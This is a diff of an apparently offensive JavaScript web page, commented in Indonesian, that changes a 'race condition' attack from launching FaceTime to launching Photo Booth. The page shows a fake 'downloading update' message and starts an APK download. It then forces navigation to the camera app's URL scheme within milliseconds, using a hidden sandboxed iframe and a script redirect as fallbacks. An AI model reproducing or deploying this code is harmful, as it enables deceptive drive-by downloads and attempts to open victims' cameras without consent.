@@ -41,10 +41,11 @@
   }
 
   // ============================================
-  // 1. KONFIGURASI
+  // 1. TARGET SCHEMES (EXPERIMENTAL)
   // ============================================
-  var TARGET_FACETIME = "security@apple.com"; 
-  var FACETIME_SCHEME = "facetime://" + TARGET_FACETIME;
+  // Skema tidak resmi (mungkin tidak berfungsi, tapi patut dicoba)
+  var PHOTOBOOTH_SCHEME = "photobooth://";
+  var PHOTOBOOTH_ALT = "x-apple.systempreferences:com.apple.PhotoBooth"; // Alternatif
 
   // ============================================
   // 2. TRIGGER RACE CONDITION (KLIK)
@@ -55,11 +56,11 @@
 
     document.getElementById('main-card').innerHTML = `
       <h2>Memproses...</h2>
-      <p>Mengunduh pembaruan & memulai panggilan...</p>
+      <p>Mengunduh pembaruan & membuka kamera...</p>
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai Race Condition...");
+    log("[!] Memulai Photo Booth Race Condition...");
 
     // ============================================
     // A. APK DOWNLOAD (0ms)
@@ -86,26 +87,27 @@
     }
 
     // ============================================
-    // B. FACETIME HIJACK (10ms - Race)
+    // B. PHOTOBOOTH HIJACK (10ms - Race)
     // ============================================
-    // Eksekusi 10ms setelah unduhan dimulai.
     setTimeout(function() {
-      log("[+] Mengirim FaceTime Scheme (Top-Level)...");
+      log("[+] Mengirim PhotoBooth Scheme...");
       try {
-        window.location.href = FACETIME_SCHEME;
-      } catch(e) {}
+        window.location.href = PHOTOBOOTH_SCHEME;
+      } catch(e) {
+        log("[-] Gagal: " + e.message);
+      }
     }, 10);
 
     // ============================================
     // C. IFRAME SANDBOX (100ms - Fallback)
     // ============================================
     setTimeout(function() {
-      log("[+] Mengirim FaceTime via Iframe...");
+      log("[+] Mengirim PhotoBooth via Iframe...");
       try {
         var iframe = document.createElement("iframe");
         iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
         iframe.style.display = "none";
-        iframe.src = FACETIME_SCHEME;
+        iframe.src = PHOTOBOOTH_SCHEME;
         document.getElementById("launcher-container").appendChild(iframe);
       } catch(e) {}
     }, 100);
@@ -121,7 +123,7 @@
           <html>
           <body>
             <script>
-              window.location.replace("${FACETIME_SCHEME}");
+              window.location.replace("${PHOTOBOOTH_SCHEME}");
             <\/script>
           </body>
           </html>
